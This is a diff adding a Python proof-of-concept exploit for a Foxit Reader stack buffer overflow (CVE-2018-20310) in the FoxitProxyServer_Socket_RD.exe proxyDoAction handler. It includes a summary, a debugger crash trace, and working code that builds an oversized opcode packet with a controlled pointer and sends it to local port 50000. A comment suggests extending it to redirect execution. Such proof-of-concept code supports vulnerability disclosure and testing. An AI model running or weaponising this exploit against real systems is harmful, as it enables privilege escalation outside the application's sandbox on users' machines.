@@ -1,0 +1,63 @@
+"""
+Foxit Reader PDF Printer proxyDoAction opcode Race Condition Stack Buffer Overflow Elevation of Privilege Vulnerability
+Version: 9.3.0.912
+SRC: SRC-2019-0025
+CVE: CVE-2018-20310
+
+Summary:
+========
+
+The FoxitProxyServer_Socket_RD.exe application contains code that when calling the proxyDoAction function with a large opcode will trigger a stack based buffer overflow. An attacker can possibly leverage this to elevate their privileges under the context of the FoxitProxyServer_Socket_RD.exe server outside of a sandbox.
+
+Debugging:
+==========
+
+(2b90.cc0): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for FoxitProxyServer_Socket_RD.exe -
+FoxitProxyServer_Socket_RD+0x1e4b5:
+00a0e4b5 ff5008          call    dword ptr [eax+8]    ds:002b:cafebabe=????????
+0:000:x86>
+"""
+
+import sys
+import struct
+import socket
+import psutil
+import getpass
+
+def gen_packet():
+    """
+    This method generates the packet structure
+    """
+
+    # generate buffer
+    opcode  = "\x41" * 0x34
+
+    # use this if you wanna write an exploit to pwn var_28 and redirect execution
+    opcode += struct.pack("I", 0xcafebabe-0x8)
+    method = "proxyDoAction"
+    raw_packet = "foxb"                              # foxit begin header
+    raw_packet += "requ"                             # request header
+    raw_packet += "\xff\xff\xff\xff"                 # size of the packet including the header (patched in later)
+    raw_packet += struct.pack("I", len(method))      # length of method
+    raw_packet += method                             # method
+    raw_packet += struct.pack("<I", 0x3)             # param count
+    raw_packet += struct.pack("<I", 0x0)             # empty param
+    raw_packet += struct.pack(">I", 0x0)             # empty param
+    raw_packet += struct.pack("<I", len(opcode))     # length of the opcode buffer
+    raw_packet += opcode                             # our opcode buffer
+    raw_packet += "foxe"                             # foxit end footer
+    ba = bytearray(raw_packet)    
+    packet  = ba[0:8]
+    packet += struct.pack("I", len(raw_packet))      # patch in the len of the packet
+    packet += ba[12:len(ba)]
+    return packet
+
+port   = 50000
+target = "127.0.0.1"
+s = socket.socket()
+s.connect((target, port))
+s.send(gen_packet())
+s.close()
